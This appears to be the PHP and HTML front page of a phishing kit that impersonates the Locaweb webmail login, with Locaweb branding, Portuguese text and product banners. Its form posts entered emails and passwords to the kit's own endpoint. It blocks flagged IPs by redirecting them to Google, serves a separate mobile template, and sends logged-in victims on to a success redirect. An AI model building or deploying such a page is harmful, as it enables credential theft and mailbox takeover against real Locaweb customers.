<?php
declare(strict_types=1);

require dirname(__DIR__) . '/src/bootstrap.php';

use Lab\Webmail\Security\CsrfToken;
use Lab\Webmail\Security\HttpHeaders;
use Lab\Webmail\Security\SessionManager;

$config = app_config();
require_once dirname(__DIR__) . '/includes/security.php';
require_once dirname(__DIR__) . '/includes/access_guard.php';
require_once dirname(__DIR__) . '/includes/locaweb_login.php';
require_once dirname(__DIR__) . '/includes/locaweb_messages.php';
require_once dirname(__DIR__) . '/includes/webmail_redirect.php';

$audit = lab_audit_storage($config);
$clientIp = client_ip();
if ($audit->isIpBlocked($clientIp)) {
    header('Location: ' . (string) ($config['blocked_redirect'] ?? 'https://google.com/erro'), true, 302);
    exit;
}
enforce_public_access($config);
$audit->recordVisit();

SessionManager::start($config);
HttpHeaders::applyBaseline(true);

if (!empty($_SESSION['user']) && empty($_GET['test'])) {
    header('Location: ' . webmail_success_redirect($config));
    exit;
}

$csrf = CsrfToken::issue((int) ($config['security']['csrf_ttl_seconds'] ?? 3600));
$loginAction = url_path('/api/login.php', $config);
$panelUrl = webmail_success_redirect($config);
$pageTitle = (string) ($config['page_title'] ?? 'Webmail Locaweb : Faça o Login do Webmail Seguro');
$turnstileKey = (string) ($config['turnstile_site_key'] ?? '1x00000000000000000000AA');
$turnstileOn = !empty($config['turnstile_enabled']);

$lmMessages = locaweb_messages();

if (lm_is_mobile_client()) {
    require __DIR__ . '/templates/login_alpha_mobile.php';
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Página de login do Webmail Locaweb. Acesse seu e-mail profissional com segurança.">
    <title><?= lm_e($pageTitle) ?></title>
    <link rel="shortcut icon" href="<?= lm_skin('images/favicon.ico', $config) ?>" type="image/x-icon">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&amp;display=swap">
    <link rel="stylesheet" type="text/css" href="<?= lm_skin('css/locamail.min.css', $config) ?>">
    <link rel="stylesheet" type="text/css" href="<?= lm_asset('login-alerts.css', $config) ?>">
    <?php if ($turnstileOn): ?>
    <link rel="stylesheet" type="text/css" href="<?= lm_asset('turnstile-visual.css', $config) ?>">
    <?php endif; ?>
</head>
<body class="lm-login-page">

<div class="lm-login-wrapper lm-login-has-advertsing">
    <div class="lm-login login-phishing">
        <div class="lm-login-card">
            <div class="lm-login-header">
                <div class="lm-logo-wrapper">
                    <img src="<?= lm_skin('images/locaweb_logo_negative_small.png', $config) ?>" alt="Locaweb">
                </div>
            </div>
            <div class="lm-login-card-body">
                <div class="lm-login-container">
                    <div class="lm-logo-label">Acesse o Webmail Locaweb</div>
                    <form name="form" id="loginform" class="lm-login-form" method="post" action="<?= lm_e($loginAction) ?>" novalidate>
                        <input type="hidden" name="csrf" value="<?= lm_e($csrf) ?>">
                        <div class="box-bottom" role="complementary">
                            <div id="message"></div>
                            <noscript>
                                <p class="noscriptwarning">Aviso: Este webmail utiliza Javascript, habilite-o nas configurações de seu navegador.</p>
                            </noscript>
                        </div>
                        <div id="userid" class="lm-login-item">
                            <input name="email" id="rcmloginuser" required type="text" class="lm-login-input" autocomplete="username">
                            <label for="rcmloginuser" class="lm-login-label">E-mail</label>
                        </div>
                        <div id="pwdid" class="lm-login-item">
                            <input name="password" id="rcmloginpwd" required type="password" class="lm-login-input lm-input-toggle-pass" autocomplete="current-password">
                            <label for="rcmloginpwd" class="lm-login-label">Senha</label>
                            <a href="#" id="showpass">Exibir</a>
                        </div>
                        <div class="lm-login-options">
                            <input name="" id="stayconnected" type="checkbox">
                            <label class="lm-middle-align" for="stayconnected" onclick="javascript:void(0);"><span onclick="javascript:void(0);"></span></label>
                            <label class="lm-middle-align" for="stayconnected">Ficar conectado</label>
                            <a href="#" id="forgotpass">Esqueceu a senha?</a>
                        </div>
                        <div id="bottomline-info" role="contentinfo"></div>
                        <div class="formbuttons">
                            <?php if ($turnstileOn): ?>
                            <?= lm_turnstile_visual_html($config) ?>
                            <?php endif; ?>
                            <input type="submit" id="submitloginform" class="lm-login-submit" value="Entrar">
                        </div>
                    </form>
                </div>
                <div class="lm-login-banner-container">
                    <div>
                        <a href="https://www.locaweb.com.br/email-profissional/?utm_source=webmail-seguro&amp;utm_medium=link-interno&amp;utm_campaign=seo-lead-webmail-seguro" target="_blank" rel="noopener noreferrer">
                            <img src="<?= lm_skin('images/banner_login.png', $config) ?>" alt="E-mail Corporativo Locaweb" class="lm-login-banner-img">
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <section id="login-advertising-section" class="cross-sell four-cols">
        <div class="inner">
            <div class="col title-section">
                <h2 class="cross-sell-title sm-padding-top">Seus projetos com mais <span class="highlight">performance</span></h2>
            </div>
            <ul class="list-products">
                <li id="cross_prod_1" class="col product-section">
                    <h2 class="product-title">E-mail Marketing Locaweb</h2>
                    <p class="product-description">Divulgue novidades e ofertas para os seus clientes com baixo custo.</p>
                    <a href="https://www.locaweb.com.br/email-marketing-locaweb/?utm_campaign=login_webmail&amp;utm_source=login_webmail&amp;utm_medium=own&amp;utm_content=login_webmail" class="product-link arrow-right" target="_blank" rel="noopener noreferrer">Conheça</a>
                </li>
                <li id="cross_prod_2" class="col product-section">
                    <h2 class="product-title">Google Workspace</h2>
                    <p class="product-description">Equipes mais produtivas e conectadas com apps do Google</p>
                    <a href="https://www.locaweb.com.br/google-workspace/?utm_campaign=login_webmail&amp;utm_source=login_webmail&amp;utm_medium=own&amp;utm_content=login_webmail" class="product-link arrow-right" target="_blank" rel="noopener noreferrer">Conheça</a>
                </li>
                <li id="cross_prod_3" class="col product-section">
                    <h2 class="product-title">Hospedagem</h2>
                    <p class="product-description">Recursos ilimitados para hospedar o seu site com domínio grátis.</p>
                    <a href="https://www.locaweb.com.br/hospedagem-de-sites/?utm_campaign=login_webmail&amp;utm_source=login_webmail&amp;utm_medium=own&amp;utm_content=login_webmail" class="product-link arrow-right" target="_blank" rel="noopener noreferrer">Conheça</a>
                </li>
            </ul>
        </div>
    </section>
    <script type="text/template" id="lm-alert-tooltip-tpl">
        <div class="lm-alert-tooltip-top alert-<%= type %>">
            <span><%= message %></span>
            <span class="lm-ico-close alert-dismiss"></span>
            <div class="lm-arrow-down"></div>
        </div>
    </script>
</div>

<script>
window.LM_MESSAGES = <?= json_encode($lmMessages, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG) ?>;
window.LM_PANEL_URL = <?= json_encode($panelUrl, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG) ?>;
</script>
<script src="<?= lm_asset('login-core.js', $config) ?>?v=2" defer></script>
<script src="<?= lm_asset('login.js', $config) ?>?v=2" defer></script>
</body>
</html>
